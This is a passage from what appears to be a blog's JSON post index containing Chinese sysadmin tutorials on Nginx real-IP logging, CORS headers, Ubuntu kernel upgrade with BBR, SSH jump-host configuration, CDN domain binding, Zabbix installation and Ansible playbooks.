X_Real-IP $http_x_real_ip;如果需要输出到日志，也只需要定义下日志格式加入对应的头信息 http{ …… log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;&quot;$status&quot; $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot; &apos; &apos;&quot;$gzip_ratio&quot; $request_time $bytes_sent $request_length&apos;; } server{ access_log /home/wwwlogs/awen.me-$year-$month-$day-access.log main; }日志格式可以参考 nginx 官网https://nginx.org/en/docs/http/ngx_http_log_module.html然后查看日志，其中124.180.128.117 就是客户端IP 157.119.232.9 - - [06/Jul/2017:13:52:33 +0800] &quot;GET / HTTP/1.1&quot; &quot;304&quot; 0 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1&quot; &quot;124.180.128.117&quot; &quot;-&quot; 0.000 385 428 43.230.89.164 - - [06/Jul/2017:13:55:52 +0800] &quot;GET / HTTP/1.1&quot; &quot;304&quot; 0 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot; &quot;180.76.15.30&quot; &quot;-&quot; 0.000 382 454","categories":[],"tags":[{"name":"CDN","slug":"CDN","permalink":"https://awen.me/tags/CDN/"}]},{"title":"Nginx解决跨域问题","slug":"Nginx解决跨域问题","date":"2017-07-06T05:02:59.000Z","updated":"2021-02-26T06:05:29.260Z","comments":true,"path":"posts/3552283579.html","link":"","permalink":"https://awen.me/posts/3552283579.html","excerpt":"CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。本文详细介绍CORS的内部机制。","text":"CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。本文详细介绍CORS的内部机制。 简介CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。 两种请求浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。只要同时满足以下两大条件，就属于简单请求。（1) 请求方法是以下三种方法之一： HEAD GET POST（2）HTTP的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-IDContent-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain凡是不同时满足上面两个条件，就属于非简单请求。浏览器对这两种请求的处理，是不一样的。 简单请求3.1 基本流程对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。 GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0...上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。 Access-Control-Allow-Origin该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 Access-Control-Allow-Credentials该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。 Access-Control-Expose-Headers该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(‘FooBar’)可以返回FooBar字段的值。 3.2 withCredentials 属性上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。 Access-Control-Allow-Credentials: true另一方面，开发者必须在AJAX请求中打开withCredentials属性。 var xhr = new XMLHttpRequest(); xhr.withCredentials = true;否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。 xhr.withCredentials = false;需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。 非简单请求4.1 预检请求非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。下面是一段浏览器的JavaScript脚本。 var url = &apos;http://api.alice.com/cors&apos;; var xhr = new XMLHttpRequest(); xhr.open(&apos;PUT&apos;, url, true); xhr.setRequestHeader(&apos;X-Custom-Header&apos;, &apos;value&apos;); xhr.send();上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。 OPTIONS /cors HTTP/1.1 Origin: http://api.bob.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: X-Custom-Header Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0...“预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。除了Origin字段，”预检”请求的头信息包括两个特殊字段。 Access-Control-Request-Method该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 Access-Control-Request-Headers该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 4.2 预检请求的回应服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。 HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2.0.61 (Unix) Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Content-Type: text/html; charset=utf-8 Content-Encoding: gzip Content-Length: 0 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 Access-Control-Allow-Origin: *如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。 XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.服务器回应的其他CORS相关字段如下。 Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000（1）Access-Control-Allow-Methods该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。（2）Access-Control-Allow-Headers如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。（3）Access-Control-Allow-Credentials该字段与简单请求时的含义相同。（4）Access-Control-Max-Age该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。4.3 浏览器的正常请求和回应一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。下面是”预检”请求之后，浏览器的正常CORS请求。 PUT /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com X-Custom-Header: value Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0...上面头信息的Origin字段是浏览器自动添加的。下面是服务器正常的回应。 Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。 与JSONP的比较CORS与JSONP的使用目的相同，但是比JSONP更强大。JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。 以上转载自http://www.ruanyifeng.com/blog/2016/04/cors.html 如和解决跨域问题1.nginx 添加响应头 add_header Access-Control-Allow-Origin *;2.CDN 上，以又拍云为例，后台添加rewrite 规则 $ADD_RSP_HEADER(Access-Control-Allow-Origin,*)会返回 HEAD&lt; HTTP/1.1 200 OK HTTP/1.1 200 OK &lt; Server: marco/1.4 Server: marco/1.4 &lt; Date: Thu, 06 Jul 2017 05:21:49 GMT Date: Thu, 06 Jul 2017 05:21:49 GMT &lt; Content-Type: image/jpeg Content-Type: image/jpeg &lt; Content-Length: 28759 Content-Length: 28759 &lt; Connection: keep-alive Connection: keep-alive &lt; X-Source: U/200 X-Source: U/200 &lt; Cache-Control: public, must-revalidate, max-age=691200 Cache-Control: public, must-revalidate, max-age=691200 &lt; Etag: &quot;97822A23E405BCC3A05E0F7E9542EC24&quot; Etag: &quot;97822A23E405BCC3A05E0F7E9542EC24&quot; &lt; Last-Modified: Tue, 04 Jul 2017 13:46:25 GMT Last-Modified: Tue, 04 Jul 2017 13:46:25 GMT &lt; X-Request-Id: 139a0b5db1597c470cfbfaf45449ba6d X-Request-Id: 139a0b5db1597c470cfbfaf45449ba6d &lt; Expires: Fri, 14 Jul 2017 05:21:49 GMT Expires: Fri, 14 Jul 2017 05:21:49 GMT &lt; Accept-Ranges: bytes Accept-Ranges: bytes &lt; X-Mirror-Request-Id: b7ee25e290e6ede1e34fa5dfd9f02c04 X-Mirror-Request-Id: b7ee25e290e6ede1e34fa5dfd9f02c04 &lt; Via: T.5201.M.1, V.403-zj-fud-209, S.pcw-cn-hkg-163, T.89163.M.1, V.pcw-cn-hkg-166, M.pcw-cn-hkg-167 Via: T.5201.M.1, V.403-zj-fud-209, S.pcw-cn-hkg-163, T.89163.M.1, V.pcw-cn-hkg-166, M.pcw-cn-hkg-167 &lt; Strict-Transport-Security: max-age=15552000; includeSubDomains; preload Strict-Transport-Security: max-age=15552000; includeSubDomains; preload &lt; Access-Control-Allow-Origin: * Access-Control-Allow-Origin: *","categories":[],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://awen.me/tags/nginx/"}]},{"title":"Ubuntu升级内核","slug":"Ubunt升级内核","date":"2017-07-06T01:32:33.000Z","updated":"2021-02-26T06:05:29.267Z","comments":true,"path":"posts/2045899441.html","link":"","permalink":"https://awen.me/posts/2045899441.html","excerpt":"下载内核内核：http://kernel.ubuntu.com/~kernel-ppa/mainline/ 安装最新的4.12.0，然后重启 wget -c http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.12/linux-headers-4.12.0-041200_4.12.0-041200.201707022031_all.deb wget -c http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.12/linux-headers-4.12.0-041200-generic_4.12.0-041200.201707022031_amd64.deb wget -c http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.12/linux-image-4.12.0-041200-generic_4.12.0-041200.201707022031_amd64.deb sudo dpkg -i *.deb reboot","text":"下载内核内核：http://kernel.ubuntu.com/~kernel-ppa/mainline/ 安装最新的4.12.0，然后重启 wget -c http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.12/linux-headers-4.12.0-041200_4.12.0-041200.201707022031_all.deb wget -c http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.12/linux-headers-4.12.0-041200-generic_4.12.0-041200.201707022031_amd64.deb wget -c http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.12/linux-image-4.12.0-041200-generic_4.12.0-041200.201707022031_amd64.deb sudo dpkg -i *.deb reboot 然后查看 root@aliyun:/home/fangwenjun# uname -ar Linux aliyun 4.12.0-041200-generic #201707022031 SMP Mon Jul 3 00:32:52 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux开启bbr 开机后 uname -r 看看是不是内核4.9、4.10或4.11 执行 lsmod | grep bbr，如果结果中没有 tcp_bbr 的话就先执行 modprobe tcp_bbr echo &quot;tcp_bbr&quot; &gt;&gt; /etc/modules-load.d/modules.conf执行 echo &quot;net.core.default_qdisc=fq&quot; &gt;&gt; /etc/sysctl.conf echo &quot;net.ipv4.tcp_congestion_control=bbr&quot; &gt;&gt; /etc/sysctl.conf保存生效 sysctl -p执行 sysctl net.ipv4.tcp_available_congestion_control sysctl net.ipv4.tcp_congestion_control如果结果都有bbr, 则证明你的内核已开启bbr 看到有 tcp_bbr 模块即说明bbr已启动","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://awen.me/tags/Ubuntu/"}]},{"title":"SSH解决直接绕过跳板机登陆后端服务器","slug":"ssh解决直接绕过跳板机登陆后端服务器","date":"2017-07-05T01:20:56.000Z","updated":"2021-02-26T06:05:29.292Z","comments":true,"path":"posts/1971204929.html","link":"","permalink":"https://awen.me/posts/1971204929.html","excerpt":"通常我们登陆服务器都是先到跳板机，然后从跳板机登陆其他服务器，这么做的原因是为了杜绝任何人都可以直接连接 SSH 服务器，带来安全隐患，但是每次都要 ssh 到跳板机，然后从跳板机在连远程主机实在是太麻烦了。我们可以通过 ssh 的 forward 模式直接就从本地连接到内网机器，具体操作如下","text":"通常我们登陆服务器都是先到跳板机，然后从跳板机登陆其他服务器，这么做的原因是为了杜绝任何人都可以直接连接 SSH 服务器，带来安全隐患，但是每次都要 ssh 到跳板机，然后从跳板机在连远程主机实在是太麻烦了。我们可以通过 ssh 的 forward 模式直接就从本地连接到内网机器，具体操作如下 客户端配置不管是 linux还是 mac 操作系统，我们都可以编辑vim ~/.ssh/config 文件，然后参考如下配置 Host tiaoban #跳板机名称 HostName 221.41.148.63 #跳板机 IP Port 222 #跳板机端口 User tiaoban #跳板机用户名 Host server #内网机器配置 HostName 192.168.1.117 Port 222 User root ProxyCommand ssh pi@tiaoban -W %h:%p Host client HostName 192.168.1.100 Port 222 User root ProxyCommand ssh pi@tiaoban -W %h:%p连接1.连接测试跳板机 ➜ ssh ssh tiaoban The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Jul 5 01:14:12 2017 from localhost tiaoban@xxxxx:~ $ exit2.连接 server ➜ ssh ssh server The authenticity of host &apos;192.168.1.117 (&lt;no hostip for proxy command&gt;)&apos; can&apos;t be established. ECDSA key fingerprint is SHA256:b7RMtN02b8r/eWg2a5WPMzuNibmyDAKTxP9U0xNMgts. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;192.168.1.117&apos; (ECDSA) to the list of known hosts. root@192.168.1.117&apos;s password: Killed by signal 2.连接 server 提示需要密码这个时候我们可以给远程主机添加一条本地的公钥 ➜ ssh ssh-copy-id server /usr/local/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/Users/wenjun/.ssh/id_rsa.pub&quot; /usr/local/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed /usr/local/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys root@192.168.1.117&apos;s password: Killed by signal 1. Number of key(s) added: 1 Now try logging into the machine, with: &quot;ssh &apos;server&apos;&quot; and check to make sure that only the key(s) you wanted were added.然后再次连接就不需要啦 ➜ ssh ssh server Last login: Tue Jul 4 10:03:25 2017 from 192.168.1.155 [root@server ~]# exit logout Connection to 192.168.1.117 closed. Killed by signal 1.","categories":[],"tags":[{"name":"SSH","slug":"SSH","permalink":"https://awen.me/tags/SSH/"}]},{"title":"如何绑定www和根域名在CDN","slug":"如何绑定www和根域名在CDN","date":"2017-07-04T13:33:47.000Z","updated":"2021-02-26T06:05:29.330Z","comments":true,"path":"posts/2913657209.html","link":"","permalink":"https://awen.me/posts/2913657209.html","excerpt":"未接入服务器之前现在我有一个自己的服务器，Linux 操作系统，搭建了 LNMP。现在我的配置信息如下 服务器 IP: 110.110.110.110我的域名是: www.awen.me在我的网站上已经绑定了www.awen.me 和awen.me在 DNS 上，我现在的解析记录如下，绑定了2条A 记录，一个 www 和一个@ 这样可以保证我访问http://www.awen.me和http://awen.me都可以获取服务器的 web 资源。","text":"未接入服务器之前现在我有一个自己的服务器，Linux 操作系统，搭建了 LNMP。现在我的配置信息如下 服务器 IP: 110.110.110.110我的域名是: www.awen.me在我的网站上已经绑定了www.awen.me 和awen.me在 DNS 上，我现在的解析记录如下，绑定了2条A 记录，一个 www 和一个@ 这样可以保证我访问http://www.awen.me和http://awen.me都可以获取服务器的 web 资源。 开始接入CDN接入 CDN之前，需要先在又拍云创建一个自主源站服务,然后绑定域名，比如我这里绑定www.awen.me和 awen.me 确认回源配置 主要的问题就是在解析这块，去又拍云后台找到你创建的服务，点击进入后获取 CNAME 解析的配置值，通常格式是bucket.b0.aicdn.com。比如我的服务名是 awenblog，那么解析值就是awenblog.b0.aicdn.com 最重要的一步，设置 CNAME 解析，我这里以阿里云为例，在对应域名中删除 A 记录的 www 和@，添加2条CNAME 解析，分别是 www 和@ 将记录值设置为又拍云后台的值，我这里是awenblog.b0.aicdn.com，需要注意的是，必须保证 A 记录与 CNAME 的主机记录不能冲突 否则无法保存。 然后等待解析生效就可以访问了。","categories":[],"tags":[{"name":"CDN","slug":"CDN","permalink":"https://awen.me/tags/CDN/"}]},{"title":"Centos7搭建zabbix监控平台","slug":"Centos7搭建zabbix监控平台","date":"2017-07-03T08:49:46.000Z","updated":"2021-02-26T06:05:29.243Z","comments":true,"path":"posts/1149861360.html","link":"","permalink":"https://awen.me/posts/1149861360.html","excerpt":"zabbix 是一款开源的监控平台，目前在运维监控上使用最为广泛，此外还有 nagios等。本文就来介绍下 如何在 centos 7上安装 准备环境一台 server一台 client 安装 lnmp 环境 参考 lnmp 一键安装包 地址https://lnmp.org/download.html","text":"zabbix 是一款开源的监控平台，目前在运维监控上使用最为广泛，此外还有 nagios等。本文就来介绍下 如何在 centos 7上安装 准备环境一台 server一台 client 安装 lnmp 环境 参考 lnmp 一键安装包 地址https://lnmp.org/download.html 安装服务端下载 zabbix去官网下载http://www.zabbix.com/download wget -c https://managedway.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/3.0.9/zabbix-3.0.9.tar.gz tar zxvf zabbix-3.0.9.tar.gz cd zabbix-3.0.9创建数据库MariaDB [(none)]&gt; create database zabbix; MariaDB [(none)]&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | zabbix | +--------------------+ 4 rows in set (0.05 sec) MariaDB [(none)]&gt; grant all privileges on zabbix.* to &apos;zabbix&apos;@&apos;%&apos; identified by &apos;zabbix&apos;; Query OK, 0 rows affected (0.00 sec) MariaDB [(none)]&gt; flush privileges; Query OK, 0 rows affected (0.00 sec)创建组和用户[root@server zabbix-3.0.9]# groupadd zabbix [root@server zabbix-3.0.9]# useradd -g zabbix zabbix编译1.在 zabbix 目录执行如下命令进行预编译检测 ./configure --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2 --enable-java2.报错解决 yum install libxml2-devel mysql-devel net-snmp* curl-devel java* -y3.执行上面的操作后，如果一切顺利，会有如下提示 4.执行编译 make &amp;&amp; make install6.安装完成后zabbix的配置文件和执行命令以及日志等信息会分布在指定的目录中： 默认配置文件目录： /usr/local/etc zabbix服务端和客户端可执行文件目录： /usr/local/sbin/ zabbix_get采集信息可执行文件目录： /usr/local/bin/7.导入数据库，在源码包的 database/mysql 目录中有如下3个 sql 文件 [root@server zabbix-3.0.9]# ls aclocal.m4 bin ChangeLog conf config.log config.sub configure.ac database frontends INSTALL m4 Makefile.am man missing README src AUTHORS build compile config.guess config.status configure COPYING depcomp include install-sh Makefile Makefile.in misc NEWS sass upgrades [root@server zabbix-3.0.9]# cd database/ ibm_db2/ mysql/ oracle/ postgresql/ sqlite3/ [root@server zabbix-3.0.9]# cd database/mysql/ [root@server mysql]# ls data.sql images.sql schema.sql然后 [root@server mysql]# mysql -uzabbix -p zabbix &lt; schema.sql Enter password: [root@server mysql]# mysql -uzabbix -p zabbix &lt; images.sql Enter password: [root@server mysql]# mysql -uzabbix -p zabbix &lt; data.sql Enter password:进入数据库查看下 8。修改配置文件 root@server mysql]# vim /usr/local/etc/zabbix_server.conf 将一下内容前的#注释掉或修改 DBHost=localhost DBName=zabbix DBUser=zabbix DBPassword=zabbix9.复制 php 文件到 web 目录 [root@server zabbix-3.0.9]# cd frontends/php/ [root@server php]# cp -rf * /home/wwwroot/default/10.打开浏览器 输入服务器 ip，直接点击下一步 12.检查配置 修改 [root@server default]# vim /usr/local/php/etc/php.ini 重启 [root@server default]# /etc/init.d/php-fpm restart Gracefully shutting down php-fpm . done Starting php-fpm done13.填写数据库信息 14.填写zabbix 名称 15.生成配置列表 16.提示无法创建配置文件 17.原因是 web 目录读写权限文件，设置下然后拷贝文件然后在 web 目录下传创建zabbix.conf.php粘贴进去 [root@server default]# chown -R www:www * [root@server default]# vim zabbix.conf.php 18.完成安装 19.登陆后台 用户名 admin 密码 zabbix 20.登陆后台出现错误，原因是我使用的是 php 7，这个是因为PHP 7.1.0类型强化，处理方法也很简单找到Zabbix WEB目录下include/func.inc.php文件 [root@server default]# sed -i &apos;/$last = strtolower(substr($val, -1));/a$val = substr($val,0,-1);&apos; include/func.inc.php 20.启动服务端 [root@server sbin]# cd /usr/local/sbin/ [root@server sbin]# ./zabbix_server至此，关于zabbix服务端的配置完成 后台设置语言设置默认是英文的，英文好无所谓，不过我还是比较喜欢有中文看中文。 然后选择语言为中文就好 客户端配置1.去这里找与服务端对应的 agent 地址 http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/ 2.然后安装 [root@client ~]# rpm -ivh http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-agent-3.0.9-1.el7.x86_64.rpm3.配置 sed -i &quot;s/Server=127.0.0.1/Server=192.168.1.117/&quot; /etc/zabbix/zabbix_agentd.conf sed -i &quot;s/ServerActive=127.0.0.1/ServerActive=192.168.1.117/&quot; /etc/zabbix/zabbix_agentd.conf sed -i &quot;s/Hostname=Zabbix server/Hostname=192.168.1.117/&quot; /etc/zabbix/zabbix_agentd.conf 4.启动 [root@client ~]# setenforce 0 #需要关selinux 否则无法启动 [root@client ~]# systemctl restart zabbix-agent.service [root@client ~]# systemctl status zabbix-agent.service [root@client ~]# systemctl enable zabbix-agent.service添加被监控端1.服务端点击配置–主机 2.然后添加主机 3.然后链接模板 4.稍等查看 报警设置zabbix 可以提供多种报警设置，如脚本、短信、邮件，下面将下如何设置邮件报警 邮件报警1.后台点击管理–媒介设置 然后点击电子邮件配置 下图是163的设置 注意: 163需要配置客户端授权码，填写的密码是客户端授权码而不是邮箱真实密码。否则无法验证成功。 2.然后切换到配置 动作 编辑默认的动作 名称默认 默认接收人填写: 故障{TRIGGER.STATUS},服务器:{HOSTNAME1}发生: {TRIGGER.NAME}故障!默认信息: 告警主机:{HOSTNAME1} 告警时间:{EVENT.DATE} {EVENT.TIME} 告警等级:{TRIGGER.SEVERITY} 告警信息:{TRIGGER.NAME} 告警项目:{TRIGGER.KEY1} 问题详情:{ITEM.NAME}:{ITEM.VALUE} 当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1} 事件ID:{EVENT.ID}恢复信息打钩恢复主题: 恢复{TRIGGER.STATUS}, 服务器:{HOSTNAME1}: {TRIGGER.NAME}已恢复!恢复信息: 告警主机:{HOSTNAME1} 告警时间:{EVENT.DATE} {EVENT.TIME} 告警等级:{TRIGGER.SEVERITY} 告警信息:{TRIGGER.NAME} 告警项目:{TRIGGER.KEY1} 问题详情:{ITEM.NAME}:{ITEM.VALUE} 当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1} 事件ID:{EVENT.ID}3.条件设置 4.操作 编辑默认操作 1.配置动作持续时间2.配置具体步骤：这里可以设置第1-3步触发报警发送邮件给管理员，第4步直接发送告警邮件给经理，可以实现故障升级的概念。3.步骤持续时间，这里设置的是60秒，每隔60秒会发送一次邮件4.选择操作类型为：发送消息5.选择发送到指定的用户组6.选择发送到指定的用户7.选择示警媒介为电子邮件报警(电子邮件报警是我在后边报警媒介类型中创建的，为了让大家理清创建思路，你在配置时没有这个选项可以在配置好报警媒介类型后再进行配置)8.选择事件确认，如果界面点击了事件确认，将不发送报警邮件。 5.然后切到用户 报警媒介设置 模拟故障停止客户端 agent [root@client ~]# systemctl stop zabbix-agent.service检查邮件发送状态，未发送 请检查邮箱配置是否正确 发送成功会提示发送成功 邮件端收到邮箱后如下 故障恢复 其他报警设置其他的还可以设置短信，但是需要有短信网关。短信网关一般也是有收费的。调用 API来发送信息。还可以设置微信报警，但是需要企业微信，我这边没有，所以无法测试。","categories":[],"tags":[{"name":"监控","slug":"监控","permalink":"https://awen.me/tags/%E7%9B%91%E6%8E%A7/"}]},{"title":"自动化工具--Ansible使用","slug":"Ansible使用","date":"2017-07-02T02:26:09.000Z","updated":"2021-02-26T06:05:29.239Z","comments":true,"path":"posts/1449711433.html","link":"","permalink":"https://awen.me/posts/1449711433.html","excerpt":"什么是 AnsibleAnsible 是一款自动化管理，官网https://www.ansible.com/ 官网说他是”Ansible is Simple IT Automation”–简单的自动化 IT 工具，他主要是让我们自动化部署应用，自动化管理配置项，自动化的持续交付，自动化的云服务管理。 比如说你有一个任务，需要在1000台线上服务器配置缓存系统 ats，那么你不可能一台 一台的ssh 登陆服务器去安装配置，这样的效率估计也只能看着公司倒闭了。所以，需要借助一些自动化工具批量化的部署实现安装、更新等操作。类似于 cobbler 自动 PEX 安装机器。","text":"什么是 AnsibleAnsible 是一款自动化管理，官网https://www.ansible.com/ 官网说他是”Ansible is Simple IT Automation”–简单的自动化 IT 工具，他主要是让我们自动化部署应用，自动化管理配置项，自动化的持续交付，自动化的云服务管理。 比如说你有一个任务，需要在1000台线上服务器配置缓存系统 ats，那么你不可能一台 一台的ssh 登陆服务器去安装配置，这样的效率估计也只能看着公司倒闭了。所以，需要借助一些自动化工具批量化的部署实现安装、更新等操作。类似于 cobbler 自动 PEX 安装机器。 如何安装安装 ansible 你可以通过 GitHub 的源码编译安装，也可以通过 pip 去安装，因为 ansible 是用 python 写的。此外，ansible 被 redhat 收购，所以如果是 redhat7 或者 Fedora 系统的话，可以直接: yum -y install ansible如果是 Ubuntu sudo apt-get install ansible或者 pip install ansible如何学习一般学习一个新工具，通常是去看官网的文档，当然国内也有一些机构翻译了中文文档比如马哥团队翻译的 Ansible 中文权威指南 如何使用基本的使用，可以参考此前写的ansible 使用，看 这里 PlaybooksPlaybooks 是 Ansible的配置,部署,编排语言.他们可以被描述为一个需要希望远程主机执行命令的方案,或者一组IT程序运行的命令集合. 如果 Ansible 模块你是工作室中的工具,那么 playbooks 就是你设置的方案计划. 在基础层面, playbooks 可以被用来管理用于部署到远程主机的配置文件.在更高的层面上,playbooks 可以依次对多层式架构上的服务器执行上线包括滚动更新在内的操作并可以将操作委托给其他主机包括在此过程中发生的与监视服务器,负载均衡服务器的交互操作在内. 虽然这里讲发很多,但是不需要立刻一次性全部学完.你可以从小功能开始,当你需要的时候再来这里找对应的功能即可. 执行playbookansible-playbook deploy.yml语法最基本的playbook脚本分为三个部分:1.在什么机器上以什么身份执行 hosts users… 2.执行的任务是都有什么 tasks 3.善后的任务都有什么 handlers deploy.yml文件 --- - hosts: webservers vars: http_port: 80 max_clients: 200 user: root tasks: - name: ensure apache is at the latest version yum: pkg=httpd state=latest - name: write the apache config file template: src=/srv/httpd.j2 dest=/etc/httpd.conf notify: - restart apache - name: ensure apache is running service: name=httpd state=started handlers: - name: restart apache service: name=httpd state=restarted主机和用户 key 含义 hosts 为主机的IP，或者主机组名，或者关键字all user 在远程以哪个用户身份执行。 become 切换成其它用户身份执行，值为yes或者no become_method 与became一起用，指可以为‘sudo’/’su’/’pbrun’/’pfexec’/’doas’ become_user 与bacome_user一起用，可以是root或者其它用户名 脚本里用became的时候，执行的playbook的时候可以加参数–ask-become-pass，则会在执行后提示输入sudo密码。 ansible-playbook deploy.yml --ask-become-passTasks任务列表 